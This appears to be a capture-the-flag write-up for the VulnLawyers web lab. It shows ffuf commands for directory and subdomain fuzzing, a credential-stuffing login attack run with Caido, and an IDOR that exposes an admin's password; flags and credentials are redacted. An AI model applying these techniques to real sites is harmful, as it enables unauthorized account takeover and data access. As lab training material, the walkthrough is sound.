VulnLawyers - CTF Walkthrough

📁 Repository Overview

This repository contains a full walkthrough of the VulnLawyers CTF, solved using only:

ffuf (directory and subdomain fuzzing)

Caido (web proxy analysis)

The methodology follows a clean, repeatable pentest format with all flags captured and documented.

All screenshots and proof-of-work are stored in the /screenshots directory.

🔧 Tools Used

ffuf – Fast web fuzzer

Caido – Web proxy for intercepting and manipulating requests

Linux shell (Parrot OS)

🧠 Objective

Gain access to the VulnLawyers web server, enumerate for vulnerabilities, escalate privileges, and capture all flags.

🛰️ 1. Recon

⚠️ Note: No ports were open for full nmap scan; proceeded directly to web-based fuzzing using known open access.

📂 2. Directory Fuzzing with ffuf (Main Domain)

ffuf -w subdomains.txt -u https://[target-ip]/FUZZ

  Key results:

    /css
    /images
    /login

🌐 3. Subdomain Discovery with ffuf (Main Domain)

ffuf -w subdomains.txt -u https://[target-ip]/ -H "Host: FUZZ.[target-ip]"

  Key result:

    data

📂 4. Directory Fuzzing with ffuf (Subdomain: data)

ffuf -w subdomains.txt -u https://data.[target-ip]/FUZZ

  Key result:

    /users

🔐 5. Intercept & Analyze with Caido

Interecepted GET /users

  Key finding:

{
    "users": [{
        "name": "Yusef Mcclain",
        "email": "________________"
    }, {
        "name": "Shayne Cairns",
        "email": "_________________________"
    }, {
        "name": "Eisa Evans",
        "email": "________________________"
    }, {
        "name": "Jaskaran Lowe",
        "email": "_______________________"
    }, {
        "name": "Marsha Blankenship",
        "email": "_________________________"
    }],
    "flag": "[________________________________]"
}

Intercepted GET /login 

  Key finding:

    /lawyers-only

Intercepted POST /lawyers-only (login attempt)

  Key findings:

    email=___&password=___

🛠️ 6. Login Access with Caido

Automated Matrix Payloads with Caido

  Used usernames found in /users domain and passwords.txt file provided by HackingHub

Gained credentials and access to /lawyers-only-profile

🔐 7. Intercept & Analyze with Caido

Intercepted GET /lawyers-only-profile-details/4 (attempted change of credentials)

  Key findings: 

Insecure Direct Object Reference (IDOR)

{
    "id": 4,
    "name": "___________",
    "email": "_____________________",
    "password": "_____________"
}

🧍 8. Privilege Escalation 

Replayed request with Caido

GET /lawyers-only-profile-details/2

  Key findings:

User that happens to be the case manager

{
    "id": 2,
    "name": "Shayne Cairns",
    "email": "_______________",
    "password": "______________",
    "flag": "[____________________]"
}

Gained access as Shayne Cairns (Case Manger - Admin)

🏁 7. Flags Captured

Flag # 1

  Path: https://[target-ip]/users

Flag # 2

  Caido Intercept: GET /login

Flag # 3

  Caido Intercept: GET /users

Flag # 4

  Staff Portal: https://[target-ip]/lawyers-only

Flag # 5

  Caido Request Replay: GET /lawyers-only-profile-details/2

Flag # 6

  Staff Portal as Shayne Cairns and deleted current case.

📌 Lessons Learned

Efficient use of just 2 tools (ffuf, caido) is enough to fully compromise a box

Importance of analyzing requests carefully in Caido

Logic flaws and poorly implemented login mechanisms are often more exploitable than buffer overflows
